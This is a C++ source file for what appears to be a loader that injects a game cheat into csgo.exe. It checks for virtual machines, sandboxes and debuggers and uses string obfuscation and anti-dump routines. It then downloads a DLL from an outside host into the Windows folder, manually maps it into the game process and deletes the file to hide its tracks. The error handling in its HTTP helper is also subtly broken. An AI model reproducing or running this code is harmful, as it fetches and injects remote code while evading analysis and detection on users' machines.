#include "Main.h"
#include <tchar.h>
#include <WinInet.h>
#pragma comment(lib,"WinInet.lib")
#include "sartaprotect.h"
#include "sartaprotect2.h"
#include "protect.h"
#include <windows.h>
#include <string>
#include <cstdio>
#include <stdio.h>
#include "curl lib/include/curl/curl.h"
#include <string.h>
#include <fstream>

string httpRequest(string site, string param)
{
	HINTERNET hInternet = InternetOpenW(L"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

	if (hInternet == NULL)
	{
		return "InternetOpenW failed(hInternet): " + GetLastError();
	}
	else
	{
		wstring widestr;
		for (int i = 0; i < site.length(); ++i)
		{
			widestr += wchar_t(site[i]);
		}
		const wchar_t* site_name = widestr.c_str();

		wstring widestr2;
		for (int i = 0; i < param.length(); ++i)
		{
			widestr2 += wchar_t(param[i]);
		}
		const wchar_t* site_param = widestr2.c_str();



		HINTERNET hConnect = InternetConnectW(hInternet, site_name, 80, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);

		if (hConnect == NULL)
		{
			return "InternetConnectW failed(hConnect == NULL): " + GetLastError();
		}
		else
		{
			const wchar_t* parrAcceptTypes[] = { L"text/*", NULL };

			HINTERNET hRequest = HttpOpenRequestW(hConnect, L"GET", site_param, NULL, NULL, parrAcceptTypes, 0, 0);

			if (hRequest == NULL)
			{
				return "HttpOpenRequestW failed(hRequest == NULL): " + GetLastError();
			}
			else
			{
				BOOL bRequestSent = HttpSendRequestW(hRequest, NULL, 0, NULL, 0);

				if (!bRequestSent)
				{
					return "!bRequestSent    HttpSendRequestW failed with error code " + GetLastError();
				}
				else
				{
					std::string strResponse;
					const int nBuffSize = 1024;
					char buff[nBuffSize];

					BOOL bKeepReading = true;
					DWORD dwBytesRead = -1;

					while (bKeepReading && dwBytesRead != 0)
					{
						bKeepReading = InternetReadFile(hRequest, buff, nBuffSize, &dwBytesRead);
						strResponse.append(buff, dwBytesRead);
					}
					return strResponse;
				}
				InternetCloseHandle(hRequest);
			}
			InternetCloseHandle(hConnect);
		}
		InternetCloseHandle(hInternet);
	}
}

int main(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	JUNK_CODE_ONE
	if (IsVMware() == FALSE && IsVirtualBox() == FALSE && IsSandboxie() == FALSE && IsVM() == FALSE && MemoryBreakpointDebuggerCheck() == FALSE && Int2DCheck() == FALSE)
	{
		AntiDump();

		LPCTSTR Url = _T(LethalStr("http://darklight.xyz/global/loader/files/slam2.dll")), File = _T(LethalStr("C://Windows//win32.dll"));
		HRESULT hr = URLDownloadToFile(0, Url, File, 0, 0);

		string proccessname = LethalStr("csgo.exe");

		string dllname = LethalStr("C:\\Windows\\win32.dll");

		manual_map->manualmapmain(proccessname.c_str(), dllname.c_str());

		Sleep(10);

		const int result = remove(LethalStr("C:\\Windows\\win32.dll"));

		ExitProcessHidden(0);

		CheckGlobalFlagsClearInFile();
		CheckGlobalFlagsClearInProcess();
		HideFromDebugger();
		DebugChecker();
		MSG msg;
		return 0;
	}
	JUNK_CODE_ONE
}
